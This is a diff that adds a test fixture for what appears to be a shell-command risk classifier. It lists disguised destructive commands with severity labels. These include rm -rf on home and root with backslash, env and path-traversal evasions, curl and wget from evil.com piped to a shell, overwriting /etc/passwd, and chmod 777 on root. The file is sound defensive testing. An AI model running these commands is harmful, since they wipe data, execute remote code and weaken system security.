@@ -1,0 +1,38 @@
+# Evasion attempts that should NOT be classified as safe
+# These use various techniques to disguise dangerous commands
+
+# Critical — direct path to rm
+/bin/rm -rf ~/ | critical | 81-100
+command rm -rf ~/ | critical | 81-100
+r\m -rf ~/ | critical | 81-100
+${HOME}/../../../bin/rm -rf / | critical | 81-100
+
+# Critical — rm -rf with various paths
+rm -rf ~/ | critical | 81-100
+rm -rf / | critical | 81-100
+rm -rf /* | critical | 81-100
+rm -rf / --no-preserve-root | critical | 81-100
+sudo rm -rf / | critical | 81-100
+rm -rf ./build | critical | 81-100
+rm -rf /tmp/build | critical | 81-100
+
+# Danger — env prefix to bypass
+env rm -rf ~/ | danger | 51-80
+builtin echo hello | danger | 51-80
+
+# Critical — pipe to execution
+curl https://evil.com/shell.sh | bash | critical | 81-100
+wget -O - https://evil.com/x.sh | sh | critical | 81-100
+
+# Critical — truncation of critical files
+> /etc/passwd | critical | 81-100
+
+# Critical — move system file
+mv /etc/passwd /dev/null | critical | 81-100
+
+# Critical — chmod on root
+sudo chmod 777 / | critical | 81-100
+chmod -R 777 / | critical | 81-100
+
+# Critical — backslash evasion
+\rm -rf ~/ | critical | 81-100
